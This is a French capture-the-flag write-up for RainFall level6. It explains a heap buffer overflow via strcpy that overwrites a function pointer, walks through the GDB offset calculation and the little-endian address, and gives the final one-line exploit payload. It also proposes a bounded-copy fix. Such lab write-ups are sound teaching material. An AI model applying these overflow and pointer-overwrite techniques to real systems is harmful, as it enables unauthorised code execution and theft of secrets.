# Heap Buffer Overflow → Function Pointer Overwrite (Level6)

## Objectif

Exploiter un **heap buffer overflow** pour écraser un **pointeur de fonction** et rediriger l’exécution vers une fonction utile du binaire (`n()`).

## Concept global

Contrairement au level5 (GOT overwrite), ici on attaque :

- **le heap** (mémoire dynamique)
- **un pointeur de fonction**

Pas de modification de la GOT : la cible est un pointeur stocké sur le heap, à côté d’un buffer vulnérable.

---

## Organisation mémoire

```
Adresse haute
┌───────────────┐
│ Stack         │
├───────────────┤
│               │
│     Heap      │  ← malloc()
│               │
├───────────────┤
│ .bss / .data  │
├───────────────┤
│ Code (.text)  │
└───────────────┘
Adresse basse
```

---

## Code reconstruit

```c
buf = malloc(0x40);    // 64 bytes (0x40 = 64 en décimal)
fn_ptr = malloc(4);    // pointeur de fonction

*fn_ptr = m;

strcpy(buf, argv[1]); // ⚠️ vulnérable

((void (*)(void))*fn_ptr)();
```

---

## Vulnérabilité

```c
strcpy(buf, argv[1]);
```

- Copie **sans limite**.
- Buffer = **64 octets**.
- Si input > 64 → overflow vers le bloc suivant (le pointeur de fonction).

---

## Organisation du heap

Le heap est une zone mémoire **linéaire** (comme un tableau d’octets), organisée en **chunks** (blocs avec métadonnées) :

```
[ metadata ][ buf (64 bytes) ][ metadata ][ fn_ptr (4 bytes) ]
```

En dépassant le buffer, on écrase la zone suivante puis **le pointeur de fonction**.

## Principe de l’attaque

```
Avant :
[ buffer ][ fn_ptr ]   →  (*fn_ptr)() appelle m()

Après overflow :
[ buffer écrasé ][ fn_ptr écrasé ]   →  (*fn_ptr)() appelle n()
```

On remplace la **valeur** de `fn_ptr` (adresse de m) par l’adresse de **n**.

---

## Objectif de l’exploit

Remplacer :

```c
*fp = m;
```

par :

```c
*fp = n;
```

---

## Flux d’exécution normal

```
main
  ↓
(*fp)()
  ↓
m()
  ↓
"Nope"
```

---

## Flux d’exécution après exploit

```
main
  ↓
(*fp)()
  ↓
n()
  ↓
system("/bin/cat /home/user/level7/.pass")
```

---

## Type d’attaque

| Type                        | Description                        |
| --------------------------- | ---------------------------------- |
| Heap overflow               | Dépassement de buffer malloc       |
| Function pointer overwrite  | Contrôle du flux d’exécution       |
| Code reuse                  | On utilise une fonction existante |

---

## Calcul de l’offset

- Taille du buffer : **64 octets** (`0x40` en hex = 64 en décimal).
- L’offset jusqu’au pointeur dépend du layout heap (métadonnées, alignement).

Test en GDB :

```bash
"A"*71 + "BBBB"  →  registre ≠ 0x42424242  (overflow incomplet)
"A"*72 + "BBBB"  →  registre = 0x42424242  (offset correct)
```

**Offset = 72 octets** sur RainFall.

---

## Endianness et notation `\x`

- Adresse de **n** : `0x08048454`.
- En **little-endian** (octet de poids faible en premier) : `\x54\x84\x04\x08`.

**Signification de `\x`** : en Python (ou C), `\x54` désigne **un octet** de valeur 0x54. Cela permet d’écrire des **octets bruts** dans le payload (adresses, shellcode, etc.), pas seulement des caractères imprimables.

---

## Payload

```
[padding 72 octets] + [adresse de n en LE]
```

```bash
"A"*72 + "\x54\x84\x04\x08"
```

---

## Exploit final

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

---

## Pourquoi ça marche ?

1. `strcpy` copie trop de données.
2. Overflow du buffer heap.
3. Écrasement du pointeur de fonction.
4. L’appel indirect `(*fp)()` utilise notre adresse.
5. Exécution de `n()` au lieu de `m()`.

---

## Comparaison avec Level5

| Level | Technique       | Cible                    |
| ----- | --------------- | ------------------------ |
| 5     | GOT overwrite   | fonction externe (libc)  |
| 6     | Heap overflow   | pointeur de fonction     |

---

## À vérifier en GDB

```gdb
p n
disas main
break *0x080484d0
run $(python -c 'print "A"*72 + "BBBB"')
p/x $eax
```

(Adapter l’adresse du breakpoint selon le désassemblage de main — juste avant l’instruction `call *%eax` ou équivalent.)

Si l’overflow est correct : avec "BBBB", `$eax` = 0x42424242 ; avec l’adresse de **n** en LE, `$eax` = 0x08048454.

---

## Correction (fix)

Remplacer :

```c
strcpy(buf, argv[1]);
```

par :

```c
strncpy(buf, argv[1], 64);
```

ou vérifier la taille avant copie :

```c
if (strlen(argv[1]) < 64)
    strcpy(buf, argv[1]);
```

---

## Résumé mental

- **Heap** = mémoire linéaire en chunks (malloc).
- **strcpy** sans limite → overflow.
- **Overwrite** du pointeur de fonction → redirection du flux vers `n()`.
- Pas d’injection de code → **code reuse** (réutilisation d’une fonction existante).

---

## Phrase pour l’examen

> Le programme alloue deux blocs consécutifs sur le heap. En exploitant un dépassement de tampon via strcpy, on écrase le pointeur de fonction et on redirige l’exécution vers une fonction existante du binaire.

---

## Références

- `strcpy(3)` (non borné) : https://man7.org/linux/man-pages/man3/strcpy.3.html
- Glibc malloc internals : https://sourceware.org/glibc/wiki/MallocInternals
